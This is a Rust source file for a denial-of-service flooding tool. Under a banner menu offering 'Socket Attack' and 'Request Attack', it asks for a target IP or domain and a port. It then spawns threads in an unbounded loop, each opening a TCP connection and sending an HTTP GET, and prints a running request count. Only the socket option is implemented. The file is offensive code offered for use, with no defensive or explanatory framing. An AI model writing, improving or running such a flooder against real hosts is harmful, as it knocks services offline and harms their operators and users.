use colored::*;
use std::io::{self, Write};
use std::net::TcpStream;
use std::thread;

static mut REQUESTS: i32 = 0;

fn make_request(ip: &str, port: &str) -> io::Result<()> {
    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
    stream.set_nodelay(true)?;

    let request = format!(
        "GET / HTTP/1.1\r\nHost: {}:{}\r\nConnection: keep-alive\r\n\r\n",
        ip, port
    );

    stream.write(request.as_bytes())?;

    unsafe {
        REQUESTS += 1;
        println!("Total requests: {}", REQUESTS);
    }

    Ok(())
}

fn main() {
    if cfg!(windows) {
        std::process::Command::new("cmd")
            .args(&["/C", "cls"])
            .status()
            .unwrap();
    }
    
    let banner = r#"
             ____        _ _        
            |  _ \ __  _(_) |_ _ __ 
            | |_) |\ \/ / | __| '__|
            |  _ <  >  <| | |_| |   
            |_| \_\/_/\_\_|\__|_|   

        
        (1) Socket Attack
        (2) Request Attack
  "#;
    println!("{}", banner.red());

    let mut input = String::new();
    print!(" Enter an option -> ");
    io::stdout().flush().expect(" Error flushing stdout.");

    io::stdin().read_line(&mut input).expect(" Error reading stdin.");

    let input = input.trim();
    if input == "1" {

        let mut ip = String::new();
        let mut port = String::new();

        print!(" IP Address or Domain (without http) -> ");
        io::stdout().flush().expect(" Error flushing stdout.");
        io::stdin().read_line(&mut ip).expect(" Error reading stdin.");

        print!("Port -> ");
        io::stdout().flush().expect("Error flushing stdout.");
        io::stdin().read_line(&mut port).expect(" Error reading stdin.");

        let ip = ip.trim();
        let port = port.trim();

        println!(" Attack started to {}:{}", ip, port);

        loop {
            let ip_clone = ip.to_owned();
            let port_clone = port.to_owned();

            thread::spawn(move || {
                if let Err(e) = make_request(&ip_clone, &port_clone) {
                    eprintln!(" Error making request: {}", e);
                }
            });
        }
    } else {
        println!(" Invalid option");
    }
}